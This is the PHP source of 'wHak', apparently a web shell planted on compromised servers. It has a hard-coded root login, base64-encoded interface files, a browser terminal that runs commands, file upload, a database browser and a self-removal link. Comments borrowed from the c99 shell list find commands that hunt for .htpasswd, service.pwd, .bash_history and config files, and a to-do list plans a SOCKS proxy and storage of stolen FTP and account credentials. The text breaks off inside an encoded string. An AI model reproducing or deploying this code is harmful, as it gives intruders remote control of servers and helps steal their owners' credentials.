<?php

# Oooo, its so shiny, and well formatted
ini_set('display_errors', 'off');
error_reporting(E_WARNING);
define('WH_START',       microtime(false));
define('WH_USER',        'root');
define('WH_PASS',        sha1('pass1'));
define('WH_CONTENT_DIR', 'wh_content/');
define('WH_STATUS',      'COMPILED');
define('WH_VERSION',     '1.28 - alpha');
define('PHP_SAFE_MODE',  in_array(ini_get('safe_mode'), array(1, 'on')));


/**
 * Need to add
 * socks proxy
 * certain snippets from c99
 * File Browser
 *  - mkdir
 *  - edit file(code Press)
 *  - Syntax highlighting on other files (geshi)
 *  - ability to browse ftp
 *
 * note types which will be in an array('username'=>'', 'password' => ''); or serialized
 *  - Better formatting
 *  - FTP Credentials
 *  - Account Credentials (Request skeleton)
 *          POST|GET
 *          URL
 *          DATA: {
 *              username: 'blah',
 *              password: 'asdas',
 *              submit: 'login'
 *          }
 *
 *
 * DB Browser
 *  - To use db_credential note type
 */

/*
 stolen from c99

  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
*/

$w = new whak();

class whak {
    var $Session;
    var $mysql;
    var $cli = false;
    var $_cfg = array(
        'session_index' => 'wh_sess'
    );

    var $Aliases;

    ####----
    var $Content = array (
  'main.css' => 'KiB7Cglmb250LXNpemU6IDEwMCU7Cglmb250LWZhbWlseTogaGVsdmV0aWNhOwp9Cgpib2R5ewoJYmFja2dyb3VuZDogIzMzMzsKfQoKLmNsZWFyewoJY2xlYXI6IGJvdGg7Cn0KCiNoZWFkZXIsICNmb290ZXIgewoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMDsKCXJpZ2h0OiAwOwoJbWFyZ2luOiAwIC41ZW0gMCAuNWVtOwoJcGFkZGluZzogM3B4OwoJYm9yZGVyOiAxcHggc29saWQgIzgwODA4MDsKCWJhY2tncm91bmQ6ICM3MDcwNzA7Cn0KCiNoZWFkZXIgewoJdG9wOiAwcHg7Cglib3JkZXItdG9wOiBub25lOwoJLW1vei1ib3JkZXItcmFkaXVzLWJvdHRvbUxlZnQ6IDZweDsKfQoKI2NvbnRlbnR7CgltYXJnaW46IDNlbSAxZW07Cn0KCiNmb290ZXJ7Cglib3R0b206IDBweDsKCWJvcmRlci1ib3R0b206IG5vbmU7CgktbW96LWJvcmRlci1yYWRpdXMtdG9wTGVmdDogNnB4OwoJLW1vei1ib3JkZXItcmFkaXVzLXRvcFJpZ2h0OiA2cHg7Cn0KCmgxIHsKCWZvbnQtc2l6ZTogMTUwJTsKCW1hcmdpbjogMCAxZW07Cn0KCmgyIHsKCWZvbnQtc2l6ZTogMTAwJTsKCW1hcmdpbjogMCAxZW07Cgljb2xvcjojYWFhOwp9CgojaGVhZGVyID4gaDEgewoJZmxvYXQ6IGxlZnQ7Cgljb2xvcjogI0ZGQUYwMDsKCWZvbnQtc2l6ZTogMTIwJTsKfQoKI3NlcnZlci1uYW1lewoJZm9udC1zaXplOiA3MCU7CglmbG9hdDogbGVmdDsKCWNvbG9yOiAjYWFhOwp9CgpkaXYuaGVhZGVyLWluZm97CmZvbnQtc2l6ZTogNjAlOwpmbG9hdDogcmlnaHQ7CnRleHQtYWxpZ246IHJpZ2h0Owpjb2xvcjogI2JiYjsKfQoKI3NlcnZlci11cHRpbWUsCiNzZXJ2ZXItbG9hZHsKCWZsb2F0OiByaWdodDsKCWZvbnQtc2l6ZTogNzAlOwoJY29sb3I6ICNiYmI7CgltYXJnaW46IDAgLjJlbTsKfQoKZGl2LnNlY3Rpb257CglkaXNwbGF5OiAtbW96LWJveDsKCS1tb3otYm94LW9yaWVudDogaG9yaXpvbnRhbDsKCS1tb3otYm94LWFsaWduOiBzdHJldGNoOwoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMWVtOwoJcmlnaHQ6IDFlbTsKCXRvcDogNGVtOwoJYm90dG9tOiAzLjJlbTsKCW92ZXJmbG93OiBhdXRvOwp9CiNzZXJ2ZXItbm90ZXMgewoJYmFja2dyb3VuZDogIzAwMDsKCWJvcmRlcjogMXB4IHNvbGlkICMzMzM7CgktbW96LWJvcmRlci1yYWRpdXM6IDZweDsKCXBhZGRpbmc6IDA7Cn0KCiNzZXJ2ZXItbm90ZXMgPiBkaXYubm90ZXsKCXBhZGRpbmc6IC4xZW07Cgljb2xvcjogI2FhYTsKfQoKI3NlcnZlci1ub3RlcyA+IGRpdi5ub3RlOmhvdmVyewoJYmFja2dyb3VuZDogIzMzMzsKfQoKI3NlcnZlci1ub3RlcyA+IGRpdi5ub3RlID4gLm9wdGlvbnMgPiAuaWNvbnsKCWZsb2F0OiBsZWZ0OwoJbWFyZ2luOiAxcHg7Cn0KCiNzZXJ2ZXItbm90ZXMgPiBkaXYubm90ZSA+IC5jb250ZW50c3sKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwp9Cgojbm90ZS1mb3JtewoJd2lkdGg6IDEwMCU7Cn0KI25vdGUtZm9ybSA+IHRleHRhcmVhewoJYmFja2dyb3VuZDogIzU1NTsKCWJvcmRlcjogMXB4IHNvbGlkICM4MDgwODA7Cgljb2xvcjogI2FhYTsKCXdpZHRoOiAzMGVtOwp9CgojY29uc29sZS1jb250ZW50ewoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMWVtOwoJcmlnaHQ6IDFlbTsKCXRvcDogNGVtOwoJYm90dG9tOiAzLjJlbTsKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwoJb3ZlcmZsb3c6IGF1dG87Cgljb2xvcjogI2FhYTsKfQoKI2NvbnNvbGUtY21kIHsKCXBvc2l0aW9uOiBmaXhlZDsKCWJvdHRvbTogMS40ZW07CglsZWZ0OiAxZW07CglyaWdodDogMWVtOwp9Cgojc2VydmVyLXByb21wdHsKCWNvbG9yOiAjYWFhOwoJZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKfQoKI2NtZCB7CgliYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKCWJvcmRlcjogbm9uZTsKCW91dGxpbmU6IG5vbmU7CglvdmVyZmxvdzogYXV0bzsKCXdpZHRoOmF1dG87CgltYXJnaW4tbGVmdDogLjVlbTsKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwoJb3ZlcmZsb3c6IGF1dG87Cgljb2xvcjogI2FhYTsKfQoKI2hlYWRlciA+IHVsLm5hdnsKCXBvc2l0aW9uOiBmaXhlZDsKCXJpZ2h0OiAuNWVtOwoJdG9wOiAxZW07CglwYWRkaW5nOiAwIC4xZW07CgktbW96LWJvcmRlci1yYWRpdXMtYm90dG9tTGVmdDogNnB4OwoJLW1vei1ib3JkZXItcmFkaXVzLWJvdHRvbVJpZ2h0OiA2cHg7CgliYWNrZ3JvdW5kOiAjNzA3MDcwOwoJYm9yZGVyOiAxcHggc29saWQgIzgwODA4MDsKCWJvcmRlci10b3A6IG5vbmU7Cn0KCiNoZWFkZXIgPiB1bC5uYXYgPiBsaSB7CglsaXN0LXN0eWxlOiBub25lOwoJZmxvYXQ6IGxlZnQ7Cglwb3NpdGlvbjogcmVsYXRpdmU7CglwYWRkaW5nOiAwOwp9CgojaGVhZGVyID4gdWwubmF2ID4gbGkgPiBhLmljb257CgltYXJnaW46IDA7CgliYWNrZ3JvdW5kLWNvbG9yOiAjNzA3MDcwOwoJYm9yZGVyLWNvbG9yOiAjNzA3MDcwOwp9CgojaGVhZGVyID4gdWwubmF2ID4gbGkgPiBhLmljb246aG92ZXJ7CgliYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOwoJYm9yZGVyLWNvbG9yOiAjMzMzOwp9Cgp0YWJsZS5maWxlLWxpc3R7CgliYWNrZ3JvdW5kOiMwMDA7Cglib3JkZXI6IDFweCBzb2xpZCAjMzMzOwoJLW1vei1ib3JkZXItcmFkaXVzOiA2cHg7Cgl3aWR0aDogMTAwJTsKCWJvcmRlci1zcGFjaW5nOiAwcHg7Cn0KCnRhYmxlLmZpbGUtbGlzdCAqIHsKCWNvbG9yOiAjYWFhOwp9Cgp0YWJsZS5maWxlLWxpc3QgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjMzMzOwp9Cgp0YWJsZS5maWxlLWxpc3QgIHRkLm9wdGlvbnMgPiAuaWNvbiB7CglmbG9hdDogbGVmdDsKCW1hcmdpbjogMXB4Owp9CgojZmlsZS1jb250ZW50c3sKCWJhY2tncm91bmQ6ICNmZmY7Cgl3aGl0ZS1zcGFjZTogcHJlOwoJYm9yZGVyOiAxcHggc29saWQgIzMzMzsKCS1tb3otYm9yZGVyLXJhZGl1czogNnB4OwoJcGFkZGluZzogNXB4OwoJbWFyZ2luOiAycHg7Cn0KCiNmaWxlLWNvbnRlbnRzOmVtcHR5ewoJZGlzcGxheTogbm9uZTsKfQoKI2ZpbGUtdXBsb2FkewoJZmxvYXQ6IHJpZ2h0Owp9CgojaWZyYW1lLWhhY2t7Cglib3JkZXI6IG5vbmU7CgloZWlnaHQ6IDBweDsKCWhlaWdodDogMHB4Owp9CgojbGVmdHsKCXdpZHRoOjEwMCU7Cn0KCiN3cmFwcGVyIHsKICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgICBjb2xvcjojQUFBQUFBICFpbXBvcnRhbnQ7CiAgICAgd2lkdGg6MTAwJTsKfQoKZmllbGRzZXQgewoJYm9yZGVyOjFweCBzb2xpZCAjQUFBQUFBCn0KCmZpZWxkc2V0IGF7CnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjpzaWx2ZXI7Cn0KCmZpZWxkc2V0IGE6aG92ZXJ7CnRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7CmNvbG9yOmdyZXk7Cn0KCnRhYmxlIGF7CnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjpzaWx2ZXI7Cn0KCnRhYmxlIGE6aG92ZXJ7CnRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7CmNvbG9yOmdyZXk7Cn0KCnRhYmxlIHsKCWZvbnQtZmFtaWx5OiAiTHVjaWRhIFNhbnMgVW5pY29kZSIsICJMdWNpZGEgR3JhbmRlIiwgU2Fucy1TZXJpZjsKCglmb250LXNpemU6IDEycHg7Cglib3JkZXI6IDFweCBzb2xpZCAjQUFBQUFBCgl3aWR0aDoxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsKCgl0ZXh0LWFsaWduOiBsZWZ0Owp9Cgp0YWJsZSB0ZHsKCWJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjY2NjOwoKCWNvbG9yOiAjNjY5OwoKCXBhZGRpbmc6IDZweCA4cHg7Cn0KCgp0YWJsZSB0aHsKCWZvbnQtc2l6ZTogMThweDsKCglmb250LXdlaWdodDogbm9ybWFsOwoKCWNvbG9yOiAjMDM5OwoKCXBhZGRpbmc6IDEwcHggOHB4OwoKCWJvcmRlci1ib3R0b206IDJweCBzb2xpZCAjNjY3OGIxOwp9Cgp0ZXh0YXJlYXsKCWhlaWdodDo5MHB4OwoJd2lkdGg6NTUwcHg7CmJhY2tncm91bmQtY29sb3I6YmxhY2s7CmNvbG9yOiNBQUFBQUE7Cn0KCiN2aWV3ewoJd2lkdGg6MTAwJTsKfQo=',
  'functions.js' => 'Ly8gZnVuY3Rpb25zCnZhciBsYXN0Tm90ZSA9IDA7CnZhciBzdGF0dXNVcGRhdGUgPSBmdW5jdGlvbiAoKXsKICAgIHZhciByZXEgPSBuZXcgUmVxdWVzdCh7CiAgICAgICAgdXJsOiAnP209aW5mbycsCiAgICAgICAgb25TdWNjZXNzOiBmdW5jdGlvbiAodGV4dCwgeG1sKXsKICAgICAgICAgICAgdmFyIHNlcnZlciA9IHhtbC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2VydmVyJylbMF07CiAgICAgICAgICAgIHZhciBzZXJ2ZXJBdHRyID0gc2VydmVyLmF0dHJpYnV0ZXM7CgogICAgICAgICAgICBmb3IodmFyIGE9MCA7IGE8c2VydmVyQXR0ci5sZW5ndGg7IGErKyl7CiAgICAgICAgICAgICAgICBpZihzZXJ2ZXJBdHRyW2FdLm5vZGVOYW1lID09ICdsYXN0X25vdGUnKXsKICAgICAgICAgICAgICAgICAgICBpZihzZXJ2ZXIuZ2V0QXR0cmlidXRlKHNlcnZlckF0dHJbYV0ubm9kZU5hbWUpID4gbGFzdE5vdGUpewogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Tm90ZSA9IE51bWJlcihzZXJ2ZXIuZ2V0QXR0cmlidXRlKHNlcnZlckF0dHJbYV0ubm9kZU5hbWUpKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIG5ldyBSZXF1ZXN0LkhUTUwoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOic/bT1nZXRfbm90ZXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlOiAnc2VydmVyLW5vdGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9uU3VjY2VzczogQWpheGlmeQogICAgICAgICAgICAgICAgICAgICAgICB9KS5zZW5kKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB2YXIgdG1wID0gJCgnc2VydmVyLScrc2VydmVyQXR0clthXS5ub2RlTmFtZSk7CiAgICAgICAgICAgICAgICAgICAgaWYodG1wKXsKICAgICAgICAgICAgICAgICAgICAgICAgdG1wLmlubmVySFRNTCA9IHVuZXNjYXBlKHNlcnZlci5nZXRBdHRyaWJ1dGUoc2VydmVyQXR0clthXS5ub2RlTmFtZSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0pLnNlbmQoKTsKfQoKdmFyIHNob3cgPSBmdW5jdGlvbiAoaWQpewogICAgdmFyIHNlY3Rpb25zID0gJCQoJ2Rpdi5zZWN0aW9uJyk7CiAgICBmb3IodmFyIGk9MDsgaTxzZWN0aW9ucy5sZW5ndGg7IGkrKyl7CiAgICAgICAgc2VjdGlvbnNbaV0uc3R5bGUuZGlzcGxheSA9IHNlY3Rpb25zW2ldLmlkID09IGlkID8gJ2Jsb2NrJyA6ICdub25lJzsKICAgIH0KICAgIHdpbmRvdy5sb2NhdGlvbi5oYXNoPScjJytpZDsKfQoKdmFyIEFqYXhpZnkgPSBmdW5jdGlvbiAoKXsKICAgIGNsYXNzTmFtZSA9ICdhamF4JzsKICAgIHN1Y2Nlc3MgICA9IEFqYXhpZnk7CiAgICB2YXIgYWogPSAkJCgnLicrY2xhc3NOYW1lKTsKCiAgICBmb3IodmFyIGk9MDsgaTxhai5sZW5ndGg7IGkrKyl7CiAgICAgICAgYWpbaV0ucmVtb3ZlQ2xhc3MoY2xhc3NOYW1lKTsKICAgICAgICBhaltpXS5hZGRFdmVudCgnY2xpY2snLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgICAgIGUuc3RvcCgpOwogICAgICAgICAgICB2YXIgb3B0ID0gewogICAgICAgICAgICAgICAgdXJsOnRoaXMuZ2V0QXR0cmlidXRlKCdocmVmJyksCiAgICAgICAgICAgICAgICB1cGRhdGU6IHRoaXMuZ2V0QXR0cmlidXRlKCd1cGRhdGUnKSwKICAgICAgICAgICAgICAgIG9uU3VjY2Vzczogc3VjY2VzcwogICAgICAgICAgICB9OwogICAgICAgICAgICBuZXcgUmVxdWVzdC5IVE1MKG9wdCkuc2VuZCgpOwogICAgICAgIH0pOwogICAgfQoKfQoKd2luZG93LmFkZEV2ZW50KCdkb21yZWFkeScsIGZ1bmN0aW9uICgpewogICAgc3RhdHVzVXBkYXRlKCk7CiAgICB2YXIgc3RhdHVzSW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCgnc3RhdHVzVXBkYXRlKCknLCAzNTAwKTsKCiAgICAkKCdjbWQtZm9ybScpLmFkZEV2ZW50KCdzdWJtaXQnLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgZS5zdG9wKCk7CiAgICAgICAgdmFyIGNvbnNvbGUgPSAkKCdjb25zb2xlLWNvbnRlbnQnKTsKICAgICAgICB2YXIgY21kICAgICA9ICQoJ2NtZCcpOwoKICAgICAgICBzd2l0Y2ggKGNtZC52YWx1ZSl7CiAgICAgICAgICAgIGNhc2UgJ2Nscyc6CiAgICAgICAgICAgIGNhc2UgJ2NsZWFyJzoKICAgICAgICAgICAgICAgIGNvbnNvbGUuaW5uZXJIVE1MID0gJyc7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnJzoKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgdGhpcy5zZXQoJ3NlbmQnLCB7b25TdWNjZXNzOiBmdW5jdGlvbiAodGV4dCl7CiAgICAgICAgICAgICAgICAgICAgJCgnY29uc29sZS1jb250ZW50JykuaW5uZXJIVE1MICs9IHRleHQ7CiAgICAgICAgICAgICAgICAgICAgJCgnY29uc29sZS1jb250ZW50Jykuc2Nyb2xsVG8oMCwgJCgnY29uc29sZS1jb250ZW50JykuZ2V0U2Nyb2xsSGVpZ2h0KCkpCiAgICAgICAgICAgICAgICB9fSk7CiAgICAgICAgICAgICAgICB0aGlzLnNlbmQoKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjbWQudmFsdWUgPSAnJzsKICAgIH0pOwoKICAgICQoJ2NvbnNvbGUtY29udGVudCcpLmFkZEV2ZW50KCdjbGljaycsIGZ1bmN0aW9uICgpeyQoJ2NtZCcpLmZvY3VzKCk7fSk7CiAgICBpZih3aW5kb3cubG9jYXRpb24uaGFzaC5zZWFyY2goL2RiLXNlY3Rpb24vaSkgPiA1KXsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicmlnaHQiKS5pbm5lckhUTUwgPSAiIjsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGVmdCIpLmlubmVySFRNTCA9ICIiOwogICAgfQogICAgQWpheGlmeSgpOwogICAgJCgnbm90ZS1mb3JtJykuYWRkRXZlbnQoJ3N1Ym1pdCcsIGZ1bmN0aW9uIChlKXsKICAgICAgICBlLnN0b3AoKTsKICAgICAgICB2YXIgbm90ZXMgPSAkKCdub3RlcycpOwogICAgICAgIGlmKG5vdGVzLnZhbHVlKXsKICAgICAgICAgICAgdGhpcy5zZXQoJ3NlbmQnLCB7CiAgICAgICAgICAgICAgICBvblN1Y2Nlc3M6IGZ1bmN0aW9uICh0ZXh0KXsKICAgICAgICAgICAgICAgICAgICAkKCdzZXJ2ZXItbm90ZXMnKS5pbm5lckhUTUwgPSB0ZXh0OwogICAgICAgICAgICAgICAgICAgIEFqYXhpZnkoJy5hamF4JywgQWpheGlmeSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB0aGlzLnNlbmQoKTsKICAgICAgICAgICAgbm90ZXMudmFsdWU9ICcnOwogICAgICAgIH0KICAgIH0pOwoKICAgIGlmKHdpbmRvdy5sb2NhdGlvbi5oYXNoKXsKICAgICAgICBzaG93KHdpbmRvdy5sb2NhdGlvbi5oYXNoLnJlcGxhY2UoLyMvLCAnJykpOwogICAgfQoKICAgICQoJ2ZpbGUtY29udGVudHMnKS5hZGRFdmVudCgnZGJsY2xpY2snLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgaWYoZS5jb250cm9sKXsKICAgICAgICAgICAgdGhpcy5lbXB0eSgpOwogICAgICAgIH0KICAgIH0pOwoKfSk7',
  'icon.silk.spritesheet.css' => '',
  'mootools.js' => '',
  'main.html' => 'cHJpbnQgJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+JzsKPz4KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sOmxhbmc9ImVuIiBsYW5nPSJlbiI+CjxoZWFkPgogICAgPHRpdGxlPndIYWsgPD9waHAgcHJpbnQgJHRoaXMtPlNlc3Npb25bJ3dob2FtaSddLidAJy4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4nOicuJHRoaXMtPlNlc3Npb25bJ2N3ZCddIC4nJCc7ID8+PC90aXRsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ij9tPWNvbnRlbnQmbz1tb290b29scy5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSI/bT1jb250ZW50Jm89ZnVuY3Rpb25zLmpzIj48L3NjcmlwdD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgbWVkaWE9InNjcmVlbiIgaHJlZj0iP209Y29udGVudCZvPW1haW4uY3NzIiAvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBtZWRpYT0ic2NyZWVuIiBocmVmPSI/bT1jb250ZW50Jm89aWNvbi5zaWxrLnNwcml0ZXNoZWV0LmNzcyIgLz4KPC9oZWFkPgo8Ym9keSBjbGFzcz0iaGJveCI+CiAgICA8ZGl2IGlkPSJoZWFkZXIiPgogICAgICAgIDxkaXYgY2xhc3M9ImhlYWRlci1pbmZvIj4KICAgICAgICAgICAgPHNwYW4gaWQ9InNlcnZlci10aW1lIj48L3NwYW4+PGJyIC8+CiAgICAgICAgICAgIDxzcGFuIGlkPSJzZXJ2ZXItcGhwX3ZlcnNpb24iPjwvc3Bhbj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8aDE+d0hhayA8P3BocCBwcmludCBXSF9WRVJTSU9OOyA/PjwvaDE+CiAgICAgICAgPHVsIGNsYXNzPSJuYXYiPgogICAgICAgICAgICA8bGk+PGEgY2xhc3M9Imljb24gdGVybWluYWwiIGhyZWY9ImphdmFzY3JpcHQ6c2hvdygnY29uc29sZS1zZWN0aW9uJykiIHRpdGxlPSJUZXJtaW5hbCI+VGVybWluYWw8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIG5vdGUiIGhyZWY9ImphdmFzY3JpcHQ6c2hvdygnbm90ZS1zZWN0aW9uJykiIHRpdGxlPSJOb3RlcyI+Tm90ZXM8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGZpbGVfZm9sZGVyIiBocmVmPSJqYXZhc2NyaXB0OnNob3coJ2ZpbGUtc2VjdGlvbicpIiB0aXRsZT0iRmlsZSBCcm93c2VyIj5GaWxlIEJyb3dzZXI8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGRhdGFiYXNlIiBocmVmPSJqYXZhc2NyaXB0OnNob3coJ2RiLXNlY3Rpb24nKSIgdGl0bGU9IkRCIEJyb3dzZXIiPkRCIEJyb3dzZXI8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGNsZWFudXAiIGhyZWY9Ij9tPWNsZWFuX3VwIiB0aXRsZT0iUmVtb3ZlIFdoYWsiPkNsZWFuIFVwPC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBjbGFzcz0iaWNvbiBmaWxlX3ppcF88Pz0oV0hfU1RBVFVTPT09J0NPTVBJTEVEJykgPyAnZ28nIDogJ2FkZCc/PiIgaHJlZj0iP209PD89KFdIX1NUQVRVUz09PSdDT01QSUxFRCcpID8gJ2V4dHJhY3QnIDogJ2NvbXBpbGUnPz4iIHRpdGxlPSJDb21waWxlL0V4dHJheHQgd2hhayI+PD89KFdIX1NUQVRVUz09PSdDT01QSUxFRCcpID8gJ0V4dHJhY3QnIDogJ0NvbXBpbGUnPz48L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGFycm93X2Rvd24iIGhyZWY9Ij9tPWRsIiB0aXRsZT0iRG93bmxvYWQgd2hhayI+RG93bmxvYWQ8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGxvZ291dCIgaHJlZj0iP209bG9nb3V0IiB0aXRsZT0iTG9nb3V0Ij5Mb2cgT3V0PC9hPjwvbGk+CiAgICAgICAgPC91bD4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0iY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbiIgaWQ9ImNvbnNvbGUtc2VjdGlvbiI+CiAgICAgICAgICAgIDxmb3JtIGlkPSJjbWQtZm9ybSIgYWN0aW9uPSI/bT1jbWQiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJjb25zb2xlLWNvbnRlbnQiPjwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBpZD0iY29uc29sZS1jbWQiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJzZXJ2ZXItcHJvbXB0Ij48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCIgaWQ9ImNtZCIgYXV0b2NvbXBsZXRlPSJvZmYiIC8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlY3Rpb24iIGlkPSJub3RlLXNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tPWRsX25vdGVzIiBjbGFzcz0iaWNvbiBhcnJvd19kb3duIiB0aXRsZT0iZG93bmxvYWQgbm90ZXMiPjwvYT4KICAgICAgICAgICAgPGRpdiBpZD0ic2VydmVyLW5vdGVzIj4KICAgICAgICAgICAgICAgIDw/cGhwIHByaW50ICR0aGlzLT5nZXRfbm90ZV9odG1sKCk7ID8+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGZvcm0gaWQ9Im5vdGUtZm9ybSIgYWN0aW9uPSI/bT1hZGRfbm90ZSIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJub3RlcyIgaWQ9Im5vdGVzIj48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiIC8+CiAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzZWN0aW9uIiBpZD0iZmlsZS1zZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgJHRoaXMtPmFjdGlvbl9scygpOwogICAgICAgICAgICA/PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlY3Rpb24iIGlkPSJkYi1zZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICA8ZGl2IGlkPSJ3cmFwcGVyIj4KICAgICAgICAgICAgPHRhYmxlPgogICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0id2lkdGg6MjAwcHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibGVmdCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmFjdGlvbl9teXNxbCgkX0dFVCk7CiAgICAgICAgICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIHZhbGlnbj0ndG9wJyBhbGlnbj0nbGVmdCc+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9InJpZ2h0Ij4mbmJzcDsKICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgIDwvZGl2PiAgICAgICAKCiAgICAgICAgICAgIAogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPGRpdiBpZD0iZm9vdGVyIj4KICAgICAgICA8ZGl2IGlkPSJzZXJ2ZXItbmFtZSI+PC9kaXY+CiAgICAgICAgPHNwYW4gaWQ9InNlcnZlci11cHRpbWU